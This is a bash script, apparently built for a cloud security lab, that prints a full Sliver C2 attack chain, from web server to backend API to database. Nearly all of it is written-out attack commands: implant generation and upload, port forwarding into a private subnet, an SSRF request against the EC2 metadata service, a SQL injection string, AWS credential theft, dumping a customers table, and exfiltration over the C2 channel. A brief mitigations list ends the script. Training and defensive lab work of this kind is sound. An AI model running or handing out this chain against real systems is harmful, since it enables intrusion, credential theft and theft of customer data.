#!/bin/bash
# Sliver C2 Pivoting Script
# Demonstrates lateral movement from web server to backend API to database

echo "=== Sliver C2 Pivoting Attack Chain ==="
echo "======================================="
echo ""
echo "This script demonstrates the full attack chain:"
echo "1. Initial compromise of web server via file upload"
echo "2. Pivot to backend API in private subnet"
echo "3. Extract database credentials from backend API"
echo "4. Exfiltrate sensitive customer data"
echo ""

# Step 1: Generate implant for web server
echo "[+] Step 1: Generating Sliver implant for web server..."
cat << 'EOF'
# On the Sliver server (bastion host):
sliver > generate --mtls <bastion-private-ip>:8443 \
  --os linux --arch amd64 \
  --format exe \
  --name web-server-implant \
  --save /tmp/implant.elf
EOF

# Step 2: Upload implant to web server
echo ""
echo "[+] Step 2: Uploading implant to web server..."
cat << 'EOF'
# Upload the implant via vulnerable endpoint:
curl -X POST -F 'file=@/tmp/implant.elf' \
  http://<web-server-ip>:8080/upload

# Response will show upload path:
# {"path":"/var/www/uploads/implant.elf"}
EOF

# Step 3: Execute implant on web server
echo ""
echo "[+] Step 3: Executing implant on web server..."
cat << 'EOF'
# SSH to web server and execute:
ssh ec2-user@<web-server-ip>
chmod +x /var/www/uploads/implant.elf
/var/www/uploads/implant.elf &

# Or trigger remotely if possible
EOF

# Step 4: Establish C2 session
echo ""
echo "[+] Step 4: Establishing C2 session..."
cat << 'EOF'
# In Sliver console:
sliver > sessions
[*] Session 1 - web-server-implant - <web-server-ip>

sliver > use 1
sliver (web-server-implant) >
EOF

# Step 5: Enumerate internal network
echo ""
echo "[+] Step 5: Enumerating internal network..."
cat << 'EOF'
# From within Sliver session:
sliver (web-server-implant) > ifconfig
# Shows internal IP addresses

sliver (web-server-implant) > netstat -an
# Shows connections to backend API (port 8081)

sliver (web-server-implant) > execute -o ip route
# Shows routing to private subnets
EOF

# Step 6: Set up port forward to backend API
echo ""
echo "[+] Step 6: Setting up port forward to backend API..."
cat << 'EOF'
# Create a port forward through the compromised web server:
sliver (web-server-implant) > portfwd add -r <backend-api-ip>:8081 -l 9001

# Now you can access backend API through localhost:9001
curl http://localhost:9001/api/customers
EOF

# Step 7: Exploit backend API
echo ""
echo "[+] Step 7: Exploiting backend API..."
cat << 'EOF'
# The backend API has IMDSv1 enabled, steal its credentials:
curl http://localhost:9001/../fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Or use SQL injection vulnerability:
curl "http://localhost:9001/api/customers/search?q=' OR 1=1--"
EOF

# Step 8: Extract database credentials
echo ""
echo "[+] Step 8: Extracting database credentials..."
cat << 'EOF'
# From backend API instance (via Sliver):
sliver (web-server-implant) > execute -o "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/imdsv1-lab-backend-api-role"

# Parse the credentials and use them to access Secrets Manager:
export AWS_ACCESS_KEY_ID=<stolen-key>
export AWS_SECRET_ACCESS_KEY=<stolen-secret>
export AWS_SESSION_TOKEN=<stolen-token>

aws secretsmanager get-secret-value --secret-id imdsv1-lab-db-credentials
EOF

# Step 9: Connect to database
echo ""
echo "[+] Step 9: Connecting to database..."
cat << 'EOF'
# With database credentials, create a tunnel:
sliver (web-server-implant) > portfwd add -r <rds-endpoint>:5432 -l 5432

# Connect locally:
PGPASSWORD=<db-password> psql -h localhost -U dbadmin -d customerdb

# Dump sensitive data:
SELECT * FROM customers;
\copy customers TO '/tmp/stolen_data.csv' CSV HEADER;
EOF

# Step 10: Exfiltrate data
echo ""
echo "[+] Step 10: Exfiltrating data..."
cat << 'EOF'
# Download the stolen data through Sliver:
sliver (web-server-implant) > download /tmp/stolen_data.csv /tmp/exfil_data.csv

# Or base64 encode and exfiltrate:
sliver (web-server-implant) > execute -o "base64 /tmp/stolen_data.csv"

# Alternative: Use DNS exfiltration or HTTPS to C2
EOF

echo ""
echo "=== Attack Chain Complete ==="
echo ""
echo "Summary of compromised assets:"
echo "- Web Server (initial foothold)"
echo "- Backend API (lateral movement)"
echo "- PostgreSQL Database (data exfiltration)"
echo "- Customer PII and financial data"
echo ""
echo "Mitigations:"
echo "1. Implement file upload validation"
echo "2. Enable IMDSv2 on all EC2 instances"
echo "3. Use VPC endpoints with restrictive policies"
echo "4. Implement network segmentation with strict security groups"
echo "5. Monitor for suspicious port forwarding and tunneling"
echo "6. Use AWS GuardDuty for threat detection"
echo "7. Implement database activity monitoring"